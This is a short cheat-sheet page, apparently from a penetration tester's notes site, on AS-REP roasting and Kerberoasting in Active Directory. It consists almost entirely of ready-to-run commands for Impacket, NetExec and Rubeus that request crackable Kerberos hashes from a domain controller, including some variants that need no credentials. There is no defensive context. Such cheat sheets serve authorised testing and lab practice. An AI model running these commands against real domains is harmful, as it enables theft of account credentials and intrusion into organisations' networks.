---
title: "Kerberoasting"
date: 2024-7-6
tags: ["as_rep roasting", "impacket", "active directory", "ad", "domain controller", "Windows", "kerberoasting", "GetNPUsers"]
---

### AS_REP Roasting

{{< tab set1 tab1 active >}}Impacket{{< /tab >}}
{{< tab set1 tab2 >}}nxc{{< /tab >}}
{{< tabcontent set1 tab1 >}}

```console
# Multiple valid usernames
impacket-GetNPUsers <DOMAIN>/ -usersfile <USERS_FILE> -no-pass -dc-ip <DC>
```

```console
# Single user without creds
impacket-GetNPUsers -no-pass -dc-ip <TARGET> <DOMAIN>/<USER>
```

{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

```console
# Multiple valid usernames
nxc ldap <TARGET> -u <USERS_FILE> -p '' --asreproast as_rep_hashes.txt
```

{{< /tabcontent >}}

---

### Kerberoasting (From Linux)

{{< tab set2 tab1 active >}}Impacket{{< /tab >}}
{{< tab set2 tab2 >}}nxc{{< /tab >}}
{{< tabcontent set2 tab1 >}}

```console
# Fix time skew
sudo ntpdate -s <DC> && impacket-GetUserSPNs -request '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP>
```

<small>*Note: Times skew have to be within 5 minutes in kerberos*</small>

```console
# Kerberoasting without cred
sudo ntpdate -s <DC> && impacket-GetUserSPNs -no-preauth <USER_WITH_DONT_REQUIRE_PREAUTH> -usersfile <USERS_FILE> -dc-host <DC_IP> <DOMAIN>/
```

{{< /tabcontent >}}
{{< tabcontent set2 tab2 >}}

```console
nxc ldap <DC_IP> -u <USER> -p '<PASSWORD>' --kerberoasting kerberoast_hashes.txt
```

{{< /tabcontent >}}

### Kerberoasting (From Windows)

{{< tab set3 tab1 active >}}rubeus{{< /tab >}}
{{< tabcontent set3 tab1 >}}

```console
.\rubeus.exe kerberoast /creduser:<DOMAIN>\<USER> /credpassword:'<PASSWORD>'
```

{{< /tabcontent >}}
